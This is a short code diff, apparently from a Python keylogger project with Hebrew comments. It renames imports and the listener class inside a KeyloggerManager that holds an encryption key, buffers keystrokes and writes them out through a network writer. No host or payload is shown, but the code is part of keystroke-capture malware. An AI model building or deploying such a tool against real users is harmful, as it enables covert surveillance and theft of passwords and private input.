@@ -1,5 +1,5 @@
-from keylogger_service import Service
-from encryption import Encryption
+from keylogger_service import KeyloggerService
+from encrypt import Encryption
 from file_writer import FileWriter
 import time
 from datetime import datetime
@@ -10,7 +10,7 @@ from network_writer import NetworkWriter
 class KeyloggerManager:
 
     def __init__(self,key):         #בעת יצירת מופע יש להכניס מפתח הצפנה
-        self.keylogger_listener = Service()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
+        self.keylogger_listener = KeyloggerService()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
         self.writer = NetworkWriter()
